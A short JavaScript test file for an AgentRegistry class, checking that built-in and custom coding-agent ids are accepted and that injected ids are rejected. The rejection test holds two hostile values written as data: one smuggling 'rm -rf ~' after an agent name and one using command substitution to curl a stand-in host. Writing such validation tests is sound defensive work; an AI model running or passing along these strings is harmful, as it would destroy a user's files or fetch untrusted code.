import { test } from 'node:test';
import assert from 'node:assert/strict';
import { AgentRegistry } from './AgentRegistry.js';

test('builtins are registered', () => {
  const r = new AgentRegistry();
  assert.equal(r.isRegistered('claude', []), true);
  assert.equal(r.isRegistered('gemini', []), true);
  assert.equal(r.isRegistered('codex', []), true);
});

test('custom agents are registered', () => {
  const r = new AgentRegistry();
  const custom = [{ id: 'aider', name: 'Aider', command: 'aider', builtin: false }];
  assert.equal(r.isRegistered('aider', custom), true);
});

test('unregistered / injection payloads are rejected', () => {
  const r = new AgentRegistry();
  assert.equal(r.isRegistered('claude; rm -rf ~', []), false);
  assert.equal(r.isRegistered('$(curl evil.sh)', []), false);
  assert.equal(r.isRegistered('', []), false);
});
